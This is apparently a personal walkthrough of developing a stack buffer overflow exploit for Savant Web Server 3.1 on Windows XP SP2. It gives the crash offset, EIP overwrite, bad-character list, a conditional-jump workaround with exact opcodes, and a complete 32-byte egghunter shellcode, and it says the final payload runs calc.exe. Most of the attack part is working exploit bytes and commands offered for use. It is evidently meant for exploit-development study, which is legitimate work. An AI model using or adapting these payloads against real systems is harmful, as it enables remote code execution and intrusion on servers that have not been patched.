xp sp2 - savant web server 3.1 - run calc.exe

1. we run exp1.py -> we have a crash
2. we look in stack and we see GET -> Follow in Dump 
3. we build exp2.py using metasploit pattern_create.rb 258
4. run exp2.py and we get 35694134 that points to 254 byte
5. we build exp3.py with EIP overwrite testing but only with 3 \x42
6. we run exp3.py and we get an int32, now only we have to search for POP r32, RETN and we find it, we edit the method with \xcc
7. we run and we get in32 -> we follow in dump selection and we see that our AAAs are 25 bytes away from us
8. so we build exp5.py with a short jump of 25 bytes also known as \xeb\x19 but our \xeb get converted into something else \xcb
9. so we must try a conditional jump in order to bypass this shit :

httpmethod = "\x70\x71\x72\x73\x74\x75\x78\x79\x7A\x7B" # Test for working conditional jumps
10. we run exp6.py and we see that x7B works fine (PF must be 0 to make the jump) , so we must set it to 0

10. using generatecodes.pl we build the list of bad characters, testing 24 or few bytes per round and looking for no crash (that means that a character is wrong																												) :

\x00\x09\x0a\x0d\x20\x2f\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x9a\x9c\x9e\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

11. at this point we try to set PF in 0, using wikipedia we find out that we change EAX, EBX, ECX or EDX Lower byte than PF is being set to 0, so setting AL to 4 will make odd number of 0s

\xb0\x03 MOV AL, 3
\x04\x01 ADD AL, 1

We check the opcodes and they are not blacklisted.

SO we must update our exploit with :

httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

12. But we have a small problem, our buffer is short so how we can find a bigger buffer? In this case the author helped us (trial and error FTW!)
13. after running exp8.py and View->Memory search for first chars in HEX: 52 30 63 58 we find that we have a new buffer in memory long enought.

14. We creat an egghunter : 
http://www.hick.org/~mmiller/shellcode/win32/egghunt_syscall.c
http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

compile in Visual Studio:
cl egghunt_syscall.c /link /debug
we get 
egghunt_syscall.exe

run on the attacker machine: wine egghunt_syscall.exe cstyle 0x58633052
and we get:
unsigned char egghunt[] = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";
WHERE 0x58633052 is the HEX repr. of R0cX

and voila : we have a 32 bytes long shellcode 

14. run exp9.py and wait for several seconds and voila we have an INT32 retn.

15. We add the shellcode without bad chars and magic happens. Till next time, all the best.